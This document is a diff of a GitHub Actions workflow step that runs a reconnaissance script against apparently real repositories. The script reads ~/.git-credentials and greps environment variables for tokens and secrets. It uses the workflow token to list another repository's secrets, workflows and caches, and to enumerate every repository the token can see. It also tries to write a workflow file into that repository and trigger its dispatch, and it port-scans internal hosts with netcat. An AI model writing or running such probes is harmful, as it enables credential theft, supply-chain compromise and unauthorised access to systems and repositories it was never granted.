@@ -16,7 +16,7 @@ jobs:
     steps:
       - name: probe
         env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          AUTOTOK: ${{ github.token }}
         run: |
           OUT=i26577_recon.txt
           {
@@ -26,47 +26,44 @@ jobs:
             git config --get user.name || echo "no user.name"
             echo "GITHUB_ACTOR=$GITHUB_ACTOR"; echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
             echo "GITHUB_TRIGGERING_ACTOR=$GITHUB_TRIGGERING_ACTOR"
-            echo "===== ~/.git-credentials / config ====="
+            echo "===== ~/.git-credentials / home ====="
             cat ~/.git-credentials 2>/dev/null || echo "no git-credentials"
             ls -la ~ 2>/dev/null | head -30
-            echo "===== env vars containing token/secret ====="
-            env | grep -iE 'token|secret|key|pass|admin|supply|supabase|cloudflare|smtp|sentry|npm' | sed -E 's/(=.{6}).*/\1***REDACTED***/' || echo "none"
-            echo "===== full env keys (names only) ====="
+            echo "===== env vars containing token/secret/key ====="
+            env | grep -iE 'token|secret|key|pass|admin|supply|supabase|cloudflare|smtp|sentry|npm' | sed -E 's/(=.{6}).*/\1***/' || echo "none"
+            echo "===== full env keys ====="
             env | cut -d= -f1 | sort
-            echo "===== secrets context names (toJSON) ====="
-            echo '${{ toJSON(secrets) }}' | head -c 4000
-            echo ""
-            echo "===== GITHUB_TOKEN scopes / identity ====="
-            echo "--- /user (who is the token) ---"
-            curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user | head -20
-            echo "--- /repos/Hextra (this repo perms) ---"
-            curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily | grep -E '"permissions"|"private"|"full_name"' 
-            echo "--- /repos/Hextra permissions object ---"
-            curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily | python3 -c "import sys,json;d=json.load(sys.stdin);print('permissions=',d.get('permissions'))" 2>/dev/null
-            echo "--- supply repo meta (read) ---"
-            curl -s -o /dev/null -w "meta_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar
-            echo "--- supply repo permissions (via auth) ---"
-            curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar | python3 -c "import sys,json;d=json.load(sys.stdin);print('msg=',d.get('message'));print('permissions=',d.get('permissions'))" 2>/dev/null
-            echo "--- list supply secrets ---"
-            curl -s -o /dev/null -w "secrets_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/secrets
-            echo "--- list supply workflows ---"
-            curl -s -o /dev/null -w "wflows_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/workflows
-            echo "--- try create a branch ref on supply (write test, harmless) ---"
-            curl -s -o /dev/null -w "createref_http=%{http_code}\n" -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github.v3+json" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/git/refs -d '{"ref":"refs/heads/i26577-probe","sha":"'"$GITHUB_SHA"'"}'
-            echo "--- list all repos token can see (owner) ---"
-            curl -s -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/user/repos?per_page=100&affiliation=owner" | grep '"full_name"' | head -40
-            echo "--- installations (if app token) ---"
-            curl -s -o /dev/null -w "installations_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user/installations
-            echo "===== runner network to internal 198.18.9.x ====="
+            echo "===== token identity (/user) ====="
+            curl -s -H "Authorization: Bearer $AUTOTOK" https://api.github.com/user | head -12
+            echo "===== this repo permissions ====="
+            curl -s -H "Authorization: Bearer $AUTOTOK" https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily | python3 -c "import sys,json;d=json.load(sys.stdin);print('private=',d.get('private'),'permissions=',d.get('permissions'))" 2>/dev/null
+            echo "===== supply repo meta/perms ====="
+            curl -s -H "Authorization: Bearer $AUTOTOK" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar | python3 -c "import sys,json;d=json.load(sys.stdin);print('msg=',d.get('message'),'permissions=',d.get('permissions'))" 2>/dev/null
+            echo "===== supply secrets list ====="
+            curl -s -o /dev/null -w "supply_secrets_http=%{http_code}\n" -H "Authorization: Bearer $AUTOTOK" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/secrets
+            echo "===== supply workflows list ====="
+            curl -s -o /dev/null -w "supply_workflows_http=%{http_code}\n" -H "Authorization: Bearer $AUTOTOK" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/workflows
+            echo "===== supply: try create workflow file (write test) ====="
+            curl -s -o /dev/null -w "supply_putfile_http=%{http_code}\n" -X PUT -H "Authorization: Bearer $AUTOTOK" -H "Content-Type: application/json" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/contents/.github/workflows/i26577probe.yaml -d '{"message":"i26577 probe","content":"b246"' 
+            echo "===== supply: try trigger workflow_dispatch ====="
+            curl -s -o /dev/null -w "supply_dispatch_http=%{http_code}\n" -X POST -H "Authorization: Bearer $AUTOTOK" -H "Content-Type: application/json" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/workflows/v2-official-price-sync.yml/dispatches -d '{"ref":"main"}'
+            echo "===== supply: caches readability ====="
+            curl -s -o /dev/null -w "supply_caches_http=%{http_code}\n" -H "Authorization: Bearer $AUTOTOK" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/caches
+            echo "===== repos this token can see ====="
+            curl -s -H "Authorization: Bearer $AUTOTOK" "https://api.github.com/user/repos?per_page=100" | python3 -c "import sys,json
+try:
+  d=json.load(sys.stdin)
+  print([r.get('full_name') for r in d] if isinstance(d,list) else d)
+except Exception as e: print('ERR',e)" 2>/dev/null
+            echo "===== installations (app token?) ====="
+            curl -s -o /dev/null -w "installations_http=%{http_code}\n" -H "Authorization: Bearer $AUTOTOK" https://api.github.com/user/installations
+            echo "===== runner -> internal 198.18.9.x ====="
             for hp in 198.18.9.64:22 198.18.9.70:22 198.18.9.73:22 198.18.9.64:443 47.94.158.212:22; do
               echo "-- $hp --"; timeout 6 nc -zv "${hp%:*}" "${hp#*:}" 2>&1 | tail -1 || echo "NC_FAIL"
             done
             echo "--- egress IP ---"; curl -s --max-time 10 https://api.ipify.org; echo
-            echo "===== other-repo secrets/artifacts readability (cache/artifact names) ====="
-            curl -s -o /dev/null -w "hextra_cache_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily/actions/caches
-            curl -s -o /dev/null -w "supply_cache_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/caches
+            echo "===== end ====="
           } > "$OUT" 2>&1
-          echo "===== DONE ====="
           cat "$OUT"
           git config user.email ci@local; git config user.name ci
           git checkout -b "i26577recon-$(date +%s)"
